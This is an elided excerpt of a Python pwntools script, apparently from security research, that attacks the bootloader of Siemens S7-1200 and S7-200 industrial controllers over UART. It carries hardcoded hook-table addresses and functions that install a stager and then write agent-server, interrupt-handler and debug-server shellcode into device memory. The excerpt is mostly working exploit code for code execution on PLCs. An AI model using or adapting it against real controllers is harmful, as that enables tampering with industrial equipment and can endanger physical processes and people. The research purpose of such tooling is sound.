...
from pwn import remote,context,log,xor,disasm
context.update(log_level="info", bits=32, endian="big", arch="arm")



# Runtime configs
# The number of seconds to sleep between every request to avoid UART buffer overflows
SEND_REQ_SAFETY_SLEEP_AMT = 0.1
...
FIRST_PAYLOAD_LOCATION = 0x20000
...
DEFAULT_STAGER_ADDHOOK_IND = 0x11
...
# Static Addresses for bootloader s7-1200 4.4.0 && 4.2.1
# UART_WRITE_BUF = 0x100367EC
# UART_READ_BUF = 0x100366EC
ADD_HOOK_TABLE_START = 0x1003A280

# Static Addresses for bootloader s7-200 2.4.1
# ADD_HOOK_TABLE_START = 0x100366c0
...
def recv_packet(r):
    ...
    if calc_checksum_byte(answ[:-1]) != answ[-1]:
        ...
        log.info("receiving packet: {}".format(answ.encode("hex")))
        return answ[1:-1]
...
def send_full_msg_via_stager(r, msg, chunk_size=2, sleep_amt=0.1):
    """
...
def install_addhook_via_stager(r, tar_addr, shellcode, stager_addhook_ind=DEFAULT_STAGER_ADDHOOK_IND, add_hook_no=DEFAULT_SECOND_ADD_HOOK_IND):
    ...
    print("going to deploy shellcode at", hex(tar_addr), "to", hex(tar_addr+len(shellcode)))
...
def arg_to_byte(arg, byte_size):
    int_value = int(arg, 16)
...
def handle_conn(r):
    ...
    start = time.time()
    with open('payloads/stager/stager.bin', 'rb') as file:
        stager_addhook_ind = install_stager(r, file.read())
        print("Writing the initial stage took {} seconds".format(time.time()-start))


    with open('payloads/agent_server/build/agent_server.bin', 'rb') as file:
        payload = file.read()
        second_addhook_ind = install_addhook_via_stager(r, 0x20000, payload, stager_addhook_ind, 0x1a)


    with open('payloads/ISR_prologue/ISR_prologue.bin', 'rb') as file:
        PAB_handler_payload = file.read()
        install_addhook_via_stager(r, 0x30000, PAB_handler_payload, stager_addhook_ind, 0x1b)

    
    with open('payloads/interrupt_handler/build/interrupt_handler.bin', 'rb') as file:
        dbgserver_payload = file.read()
        install_addhook_via_stager(r, 0x31000, dbgserver_payload, stager_addhook_ind, 0x1c)
